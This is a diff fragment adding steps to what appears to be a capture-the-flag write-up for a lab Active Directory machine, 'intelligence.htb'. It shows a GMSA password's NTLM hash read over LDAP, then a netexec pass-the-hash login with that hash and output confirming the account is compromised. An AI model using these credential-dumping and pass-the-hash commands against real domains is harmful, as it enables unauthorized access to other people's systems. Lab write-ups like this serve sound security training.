@@ -512,4 +512,12 @@ LDAP        10.129.95.154   389    DC               [+] intelligence.htb\ted.gra
 LDAP        10.129.95.154   389    DC               [*] Getting GMSA Passwords
 LDAP        10.129.95.154   389    DC               Account: svc_int$             NTLM: 3c356107d6b589fdfc215e2c3de484b5     PrincipalsAllowedToReadPassword: ['DC$', 'itsupport']
 ```
+I now have the users NTLM hash 
+
+```python
+nxc smb dc.intelligence.htb -u 'svc_int$' -H '3c356107d6b589fdfc215e2c3de484b5'                                               
+SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.95.154   445    DC               [+] intelligence.htb\svc_int$:3c356107d6b589fdfc215e2c3de484b5
+```
+This user is compromised
 
